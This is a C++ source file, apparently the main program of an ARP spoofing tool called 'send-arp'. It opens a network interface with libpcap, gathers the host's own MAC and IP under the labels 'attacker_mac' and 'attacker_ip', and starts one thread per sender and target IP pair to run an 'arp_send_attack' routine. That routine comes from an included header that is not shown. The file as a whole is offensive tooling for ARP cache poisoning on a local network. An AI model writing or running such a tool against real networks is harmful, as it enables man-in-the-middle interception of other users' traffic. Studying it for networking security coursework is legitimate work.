#include <cstdio>
#include <pcap.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <sys/ioctl.h>
#include <net/if.h> 
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>

#include "util.h"
#include "mainstruct.h"
#include "arpattk.h"

void usage() {
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void print_info(char* sender_ip, char* target_ip){
	printf("==========================================================\n");
	printf("[SENDER] %s -> [TARGET] %s\n", sender_ip, target_ip);
	printf("==========================================================\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc) % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    char* dev_name = argv[1];

    // pcap open
    pcap_t* handle = pcap_open_live(dev_name, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	struct ifreq attacker_ifr;
    struct ifconf attacker_ifc;

	uint8_t* attacker_mac = get_host_mac(attacker_ifr, attacker_ifc, dev);
	char* attacker_ip = get_host_ip(attacker_ifr, dev);

	pthread_t* thread = (pthread_t*)malloc(sizeof(pthread_t) * (argc / 2));
	for(int i = 2; i < argc; i += 2){
		char* sender_ip = argv[i];
		char* target_ip = argv[i + 1];

		MultiArgv *attack_data = (MultiArgv *)malloc(sizeof(MultiArgv));
		attack_data->handle = handle;
		attack_data->sender_ip = sender_ip;
		attack_data->target_ip = target_ip;
		attack_data->attacker_ip = attacker_ip;
		attack_data->attacker_mac = attacker_mac;

		
		print_info(sender_ip, target_ip);
		pthread_create(&thread[i], NULL, arp_send_attack, (void*)attack_data);
	}
	
	for(int i = 2; i < argc; i += 2){
		pthread_join(thread[i], NULL);
	}

	free(thread);
	pcap_close(handle);
}
